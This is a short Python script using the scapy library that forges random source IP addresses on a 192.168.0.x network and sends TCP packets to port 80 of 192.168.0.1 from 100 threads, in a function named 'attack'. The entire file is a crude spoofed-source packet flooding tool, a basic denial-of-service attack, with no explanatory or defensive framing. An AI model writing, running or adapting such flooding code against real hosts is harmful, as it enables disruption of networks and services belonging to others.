from scapy.all import *
import random

#source_IP = input("Enter IP address of Source: ")
#target_IP = input("Enter IP address of Target: ")
#source_port = int(input("Enter Source Port Number:"))
ip = random.randint(20,30)
source_IP = f'192.168.0.{ip}'
target_IP = '192.168.0.1'

def attack():
   
   source_port = random.randint(10,80)
   IP1 = IP(src = source_IP, dst = target_IP)
   TCP1 = TCP(sport = source_port, dport = 80)
   pkt = IP1 / TCP1
   send(pkt, inter = .001)
   
   #print ("packet sent ")

for i in range(100):
    thread = threading.Thread(target=attack)
    thread.start()